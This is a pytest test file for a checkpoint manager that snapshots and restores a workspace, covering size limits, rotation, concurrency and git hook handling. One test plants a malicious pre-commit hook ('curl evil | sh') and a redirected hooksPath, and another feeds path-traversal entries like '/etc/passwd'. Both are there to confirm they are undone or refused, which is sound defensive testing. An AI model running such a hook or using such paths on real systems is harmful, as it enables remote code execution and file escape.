"""Checkpoints are bounded (what is copied, how big, how many) and keep the git files that can run code."""
import json
import logging
import threading
from pathlib import Path

import pytest

from harness.checkpoints import CheckpointManager


def files_of(cpm, cp_id):
    return set(json.loads((cpm.storage / cp_id / "meta.json").read_text(encoding="utf-8"))["files"])


def put(path: Path, text: str = "x") -> Path:
    path.parent.mkdir(parents=True, exist_ok=True)
    path.write_text(text, encoding="utf-8")
    return path


def workspace(tmp_path: Path) -> Path:
    ws = tmp_path / "ws"
    put(ws / "src" / "main.py", "print(1)")
    return ws


def test_heavy_folders_are_left_out(tmp_path):
    ws = workspace(tmp_path)
    for heavy in ("node_modules/pkg/index.js", ".venv/lib/x.py", "pkg/__pycache__/x.pyc", "build/out.o", "dist/app.js", "sub/node_modules/y.js"):
        put(ws / heavy)
    put(ws / ".git" / "objects" / "ab" / "cdef")
    cpm = CheckpointManager(ws, storage_dir=tmp_path / "cps")
    assert files_of(cpm, cpm.create()) == {"src/main.py"}


def test_the_excluded_folders_can_be_chosen(tmp_path, monkeypatch):
    ws = workspace(tmp_path)
    put(ws / "data" / "big.csv")
    put(ws / "build" / "keep.txt")
    cpm = CheckpointManager(ws, storage_dir=tmp_path / "a", exclude=("data",))
    assert files_of(cpm, cpm.create()) == {"src/main.py", "build/keep.txt"}
    monkeypatch.setenv("BASALT_CHECKPOINT_EXCLUDE", "data, src/generated")
    put(ws / "src" / "generated" / "g.py")
    cpm = CheckpointManager(ws, storage_dir=tmp_path / "b", exclude=())
    assert files_of(cpm, cpm.create()) == {"src/main.py", "build/keep.txt"}


def test_a_file_over_the_limit_is_skipped_with_a_warning_and_left_alone_by_a_rewind(tmp_path, caplog):
    ws = workspace(tmp_path)
    put(ws / "model.bin", "z" * 5000)
    cpm = CheckpointManager(ws, storage_dir=tmp_path / "cps", max_file_bytes=1000)
    with caplog.at_level(logging.WARNING, logger="basalt.checkpoints"):
        cp = cpm.create()
    assert files_of(cpm, cp) == {"src/main.py"} and "model.bin" in caplog.text
    meta = json.loads((cpm.storage / cp / "meta.json").read_text(encoding="utf-8"))
    assert meta["skipped"][0]["path"] == "model.bin" and meta["skipped"][0]["reason"] == "too large"
    put(ws / "src" / "main.py", "changed")
    put(ws / "model.bin", "z" * 6000)
    put(ws / "other.big", "q" * 9000)
    cpm.restore(cp)
    assert (ws / "src" / "main.py").read_text(encoding="utf-8") == "print(1)"
    assert (ws / "model.bin").read_text(encoding="utf-8") == "z" * 6000 and (ws / "other.big").exists()   # never covered, never deleted


def test_one_snapshot_stops_at_the_total_limit(tmp_path, caplog):
    ws = workspace(tmp_path)
    for i in range(5):
        put(ws / f"f{i}.txt", "a" * 400)
    cpm = CheckpointManager(ws, storage_dir=tmp_path / "cps", max_total_bytes=1000)
    with caplog.at_level(logging.WARNING, logger="basalt.checkpoints"):
        cp = cpm.create()
    meta = json.loads((cpm.storage / cp / "meta.json").read_text(encoding="utf-8"))
    assert meta["bytes"] <= 1000 and len(meta["files"]) < 6 and any(s["reason"] == "snapshot limit" for s in meta["skipped"])
    assert "snapshot would pass" in caplog.text


def test_the_oldest_snapshots_are_deleted_over_the_total_limit(tmp_path):
    ws = workspace(tmp_path)
    put(ws / "a.txt", "a" * 400)
    cpm = CheckpointManager(ws, storage_dir=tmp_path / "cps", max_total_bytes=1500)
    ids = [cpm.create(str(i)) for i in range(6)]                       # each is ~408 bytes
    kept = [m["checkpoint_id"] for m in cpm.list_checkpoints()]
    assert kept == ids[-3:] and not (cpm.storage / ids[0]).exists()
    assert cpm.list_checkpoints()[-1]["checkpoint_id"] == ids[-1]       # the newest is never the one rotated away


def test_a_snapshot_larger_than_the_limit_alone_is_kept_and_a_rewind_target_survives_its_safety_snapshot(tmp_path):
    ws = workspace(tmp_path)
    put(ws / "a.txt", "a" * 400)
    cpm = CheckpointManager(ws, storage_dir=tmp_path / "cps", max_total_bytes=500)
    first = cpm.create()
    put(ws / "a.txt", "changed")
    cpm.restore(first)                                                  # its safety snapshot must not rotate `first` away mid-restore
    assert (ws / "a.txt").read_text(encoding="utf-8") == "a" * 400
    assert cpm.last_safety_checkpoint in [m["checkpoint_id"] for m in cpm.list_checkpoints()]


def test_hooks_and_config_under_git_are_kept_and_the_rest_of_git_is_not(tmp_path):
    ws = workspace(tmp_path)
    put(ws / ".git" / "HEAD", "ref: refs/heads/main")
    put(ws / ".git" / "config", "[core]\n")
    put(ws / ".git" / "hooks" / "pre-commit", "#!/bin/sh\necho ok\n")
    put(ws / ".git" / "refs" / "heads" / "main", "abc")
    put(ws / "sub" / ".git" / "hooks" / "post-merge", "x")
    cpm = CheckpointManager(ws, storage_dir=tmp_path / "cps")
    cp = cpm.create()
    assert files_of(cpm, cp) == {"src/main.py", ".git/config", ".git/hooks/pre-commit", "sub/.git/hooks/post-merge"}
    put(ws / ".git" / "hooks" / "pre-commit", "#!/bin/sh\ncurl evil | sh\n")
    put(ws / ".git" / "config", "[core]\nhooksPath = /tmp/evil\n")
    put(ws / ".git" / "hooks" / "post-checkout", "new")
    cpm.restore(cp)
    assert (ws / ".git" / "hooks" / "pre-commit").read_text(encoding="utf-8") == "#!/bin/sh\necho ok\n"
    assert (ws / ".git" / "config").read_text(encoding="utf-8") == "[core]\n"
    assert not (ws / ".git" / "hooks" / "post-checkout").exists()
    assert (ws / ".git" / "HEAD").read_text(encoding="utf-8") == "ref: refs/heads/main"       # not part of a snapshot, not touched


def test_a_git_file_that_points_elsewhere_is_kept(tmp_path):
    ws = workspace(tmp_path)
    put(ws / ".git", "gitdir: ../real/.git/worktrees/w")
    cpm = CheckpointManager(ws, storage_dir=tmp_path / "cps")
    assert ".git" in files_of(cpm, cpm.create())


@pytest.mark.parametrize("entry", ["/etc/passwd", "C:/Windows/x.txt", "../../escape.txt", "a/../../b", 7, "", None])
def test_damaged_entries_are_refused_before_anything_is_touched(tmp_path, entry):
    ws = workspace(tmp_path)
    cpm = CheckpointManager(ws, storage_dir=tmp_path / "cps")
    cp = cpm.create()
    meta_path = cpm.storage / cp / "meta.json"
    meta = json.loads(meta_path.read_text(encoding="utf-8"))
    meta["files"].append(entry)
    meta_path.write_text(json.dumps(meta), encoding="utf-8")
    put(ws / "src" / "main.py", "edited")
    before = len(cpm.list_checkpoints())
    with pytest.raises(ValueError):
        cpm.restore(cp)
    assert (ws / "src" / "main.py").read_text(encoding="utf-8") == "edited" and len(cpm.list_checkpoints()) == before


def test_an_entry_without_its_copy_is_refused_before_anything_is_touched(tmp_path):
    ws = workspace(tmp_path)
    cpm = CheckpointManager(ws, storage_dir=tmp_path / "cps")
    cp = cpm.create()
    (cpm.storage / cp / "data" / "src" / "main.py").unlink()
    put(ws / "extra.txt", "mine")
    with pytest.raises(FileNotFoundError):
        cpm.restore(cp)
    assert (ws / "extra.txt").exists()


def test_files_made_by_hand_after_a_snapshot_can_be_brought_back(tmp_path):
    ws = workspace(tmp_path)
    cpm = CheckpointManager(ws, storage_dir=tmp_path / "cps")
    cp = cpm.create()
    put(ws / "notes.md", "written by hand")
    cpm.restore(cp)
    assert not (ws / "notes.md").exists()
    cpm.restore(cpm.last_safety_checkpoint)
    assert (ws / "notes.md").read_text(encoding="utf-8") == "written by hand"


def test_two_managers_on_one_storage_never_take_the_same_id(tmp_path, monkeypatch):
    ws = workspace(tmp_path)
    monkeypatch.setattr("harness.checkpoints.time.time", lambda: 1_700_000_000.0)       # the same millisecond for everyone
    managers = [CheckpointManager(ws, storage_dir=tmp_path / "cps") for _ in range(3)]
    ids, errors = [], []

    def work(m):
        try:
            for _ in range(4):
                ids.append(m.create())
        except Exception as exc:                                                         # pragma: no cover
            errors.append(exc)
    threads = [threading.Thread(target=work, args=(m,)) for m in managers]
    [t.start() for t in threads]
    [t.join() for t in threads]
    assert not errors and len(ids) == len(set(ids)) == 12 and len(managers[0].list_checkpoints()) == 12


def test_a_failed_snapshot_leaves_nothing_behind(tmp_path, monkeypatch):
    ws = workspace(tmp_path)
    cpm = CheckpointManager(ws, storage_dir=tmp_path / "cps")
    monkeypatch.setattr(cpm, "_walk", lambda: (_ for _ in ()).throw(RuntimeError("disk")))
    with pytest.raises(RuntimeError):
        cpm.create()
    assert list((tmp_path / "cps").iterdir()) == []
